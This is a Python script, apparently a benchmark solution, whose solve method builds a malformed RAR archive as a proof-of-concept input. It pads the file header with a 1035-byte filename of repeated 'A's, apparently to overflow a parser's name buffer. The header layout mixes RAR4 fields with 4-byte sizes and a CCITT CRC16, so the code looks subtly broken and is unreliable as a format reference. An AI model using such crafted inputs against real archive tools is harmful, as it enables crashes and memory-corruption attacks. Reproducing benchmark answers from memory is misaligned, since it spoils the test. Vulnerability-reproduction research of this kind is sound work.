import struct

def crc16(data):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8) & 0xffff
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) & 0xffff) ^ 0x1021
            else:
                crc = (crc << 1) & 0xffff
    return crc

def encode_varint(val):
    if val == 0:
        return b'\x00'
    bytes_list = []
    while val > 0:
        bytes_list.append(val & 0x7f)
        val >>= 7
    for i in range(len(bytes_list) - 1):
        bytes_list[i] |= 0x80
    return bytes(bytes_list)

class Solution:
    def solve(self, src_path: str) -> bytes:
        sig = b'Rar!\x1A\x07\x00'
        # ARCHIVE_HEADER
        type_a = b'\x73'
        flags_a = b'\x00'
        size_a = 8
        body_a = b''
        data_crc_a = type_a + flags_a + struct.pack('<I', size_a) + body_a
        crca = crc16(data_crc_a)
        header_a = struct.pack('<H', crca) + type_a + flags_a + struct.pack('<I', size_a) + body_a
        # FILE_HEADER
        type_f = b'\x74'
        flags_f = b'\x00'
        unp_size = 0
        attr = 0
        file_flags = 0
        meth = 0x30
        os_type = 0
        file_crc = 0
        comp_flags = 0
        body_f = (struct.pack('<Q', unp_size) +
                  struct.pack('<I', attr) +
                  struct.pack('<B', file_flags) +
                  struct.pack('<B', meth) +
                  struct.pack('<B', os_type) +
                  struct.pack('<I', file_crc) +
                  struct.pack('<H', comp_flags))
        size_f = 8 + len(body_f)
        data_crc_f = type_f + flags_f + struct.pack('<I', size_f) + body_f
        crcf = crc16(data_crc_f)
        header_f = struct.pack('<H', crcf) + type_f + flags_f + struct.pack('<I', size_f) + body_f
        # Name
        name_size = 1035
        varint = encode_varint(name_size)
        name = b'A' * name_size
        # END_HEADER
        type_e = b'\x00'
        flags_e = b'\x00'
        size_e = 8
        body_e = b''
        data_crc_e = type_e + flags_e + struct.pack('<I', size_e) + body_e
        crce = crc16(data_crc_e)
        header_e = struct.pack('<H', crce) + type_e + flags_e + struct.pack('<I', size_e) + body_e
        # Assemble
        poc = sig + header_a + header_f + varint + name + header_e
        return poc